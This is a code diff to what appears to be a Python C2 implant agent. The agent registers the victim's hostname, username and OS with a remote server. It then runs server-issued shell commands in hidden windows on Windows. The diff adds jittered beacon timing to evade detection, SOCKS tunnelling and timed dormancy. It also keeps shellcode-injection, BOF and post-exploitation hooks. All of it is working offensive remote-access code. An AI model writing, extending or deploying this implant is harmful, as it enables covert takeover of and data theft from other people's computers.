@@ -308,69 +308,124 @@ def execute_command(command: str) -> str:
         return hidden_desktop(command)
     if str(command).startswith('__px:'):
         return postex(command)
-    if str(command).startswith('__bof:'):
-        return _handle_bof(command)
     if str(command).startswith('__fs:'):
         return _handle_fs(command)
+    if str(command).startswith('__bof:'):
+        return _handle_bof(command)
     if str(command).startswith('__shinject:'):
         return _handle_shinject(command)
     if str(command).startswith('__asm:'):
         return _handle_asm(command)
-    if command == '__kill':
-        sys.exit(0)
-    if command == '__dormant':
-        return '__dormant__'
-    if command.startswith('__set_interval:'):
-        return '__set_interval__'
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+        if command.startswith('cd '):
+            directory = command[3:].strip()
+            os.chdir(directory)
+            return f"Changed directory to {os.getcwd()}"
+        if sys.platform == 'win32':
+            CREATE_NO_WINDOW = 0x08000000
+            parts = command.split()
+            try:
+                result = subprocess.run(parts, capture_output=True, text=True, timeout=30,
+                                         cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+                output = result.stdout + result.stderr
+                if output.strip():
+                    return output
+            except (FileNotFoundError, OSError):
+                pass
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+        else:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd())
         return (result.stdout + result.stderr) or 'Command executed successfully (no output)'
     except Exception as e:
         return f'Error: {e}'
 
+def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
+    if jitter_percent <= 0 or jitter_percent > 100:
+        return float(base_interval)
+    jitter_amount = base_interval * (jitter_percent / 100.0)
+    min_sleep = base_interval - jitter_amount
+    max_sleep = base_interval + jitter_amount
+    return random.uniform(max(0, min_sleep), max_sleep)
+
 def connect_to_server():
+    beacon_interval = BEACON_INTERVAL
+    beacon_jitter = BEACON_JITTER
     agent_id = None
     pending = []
-    beacon_interval = BEACON_INTERVAL
-    dormant = False
     while True:
         try:
-            if dormant:
-                stealth_sleep(beacon_interval)
-                continue
             if not agent_id:
-                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(), 'os': platform.system(), 'mode': 'beacon', 'beacon_interval': beacon_interval}
+                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(),
+                        'os': platform.system(), 'mode': 'beacon',
+                        'beacon_interval': beacon_interval, 'beacon_jitter': beacon_jitter}
                 reply = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps({'type': 'register', 'metadata': meta})))))
                 agent_id = reply.get('agent_id') or None
                 if not agent_id:
                     stealth_sleep(5)
                     continue
-            msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval, 'hostname': socket.gethostname()}, 'results': pending}
+
+            _drain_socks_data(pending)
+
+            msg = {'type': 'checkin', 'agent_id': agent_id,
+                   'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval,
+                                'beacon_jitter': beacon_jitter, 'hostname': socket.gethostname()},
+                   'results': pending}
             pending = []
             data = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps(msg)))))
             if data.get('type') == 'registered':
                 agent_id = data.get('agent_id')
                 continue
-            for cmd in data.get('commands') or []:
-                command = cmd.get('command', '')
-                if command == '__kill':
-                    sys.exit(0)
-                if command:
-                    output = execute_command(command)
-                    if output == '__dormant__':
-                        dormant = True
-                        pending.append({'type': 'response', 'command': command, 'output': 'Agent entering dormant mode', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
+            if data.get('type') == 'commands':
+                for cmd_data in data.get('commands', []):
+                    cmd_type = cmd_data.get('type', '')
+                    if cmd_type in ('socks_init', 'socks_connect', 'socks_send', 'socks_close'):
+                        _handle_socks_command(cmd_data, pending)
                         continue
-                    if output == '__set_interval__':
+                    command = cmd_data.get('command', '')
+                    cmd_id = cmd_data.get('command_id', '')
+                    if command.startswith('__set_interval:'):
                         try:
-                            new_interval = int(command.split(':', 1)[1])
-                            beacon_interval = new_interval
-                            pending.append({'type': 'response', 'command': command, 'output': f'Beacon interval set to {new_interval}s', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
+                            beacon_interval = int(command.split(':')[1])
                         except (ValueError, IndexError):
-                            pending.append({'type': 'response', 'command': command, 'output': 'Error: invalid interval', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
+                            pass
                         continue
-                    pending.append({'type': 'response', 'command': command, 'output': output, 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
-            stealth_sleep(beacon_interval)
+                    if command == '__kill':
+                        sys.exit(0)
+                    if command.startswith('__dormant:'):
+                        try:
+                            hours = float(command.split(':')[1])
+                            secs = int(hours * 3600)
+                            pending.append({
+                                'type': 'response',
+                                'output': f'Going dormant for {hours}h ({secs}s)',
+                                'command': command,
+                                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
+                            })
+                            dormant_msg = {
+                                'type': 'checkin', 'agent_id': agent_id,
+                                'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval},
+                                'results': pending
+                            }
+                            exchange(simple_encrypt(json.dumps(dormant_msg)))
+                            pending = []
+                            time.sleep(secs)
+                        except (ValueError, IndexError):
+                            pass
+                        continue
+                    if command:
+                        output = execute_command(command)
+                        result_entry = {
+                            'type': 'response', 'output': output,
+                            'command': command,
+                            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
+                        }
+                        if cmd_id:
+                            result_entry['command_id'] = cmd_id
+                        pending.append(result_entry)
+            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
+            stealth_sleep(sleep_time)
         except Exception:
             stealth_sleep(5)
 
